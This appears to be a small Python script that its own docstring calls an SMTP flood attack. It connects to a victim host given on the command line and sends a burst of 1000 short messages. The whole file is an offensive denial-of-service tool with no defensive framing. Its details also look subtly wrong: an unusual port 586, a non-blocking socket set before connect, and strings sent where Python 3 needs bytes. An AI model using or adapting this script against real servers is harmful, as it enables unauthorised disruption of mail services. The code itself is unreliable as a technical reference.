"""
This script implements SMTP flood attack.
"""

import socket
import sys

# GLOBALS
victim = sys.argv[1]
SMTP_PORT = 586


# ATTACK
def smtp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0)
    sock.connect((victim, SMTP_PORT))

    for i in range(1000):
        sock.send(str(i))

    sock.close()


if __name__ == '__main__':
    smtp_flood()
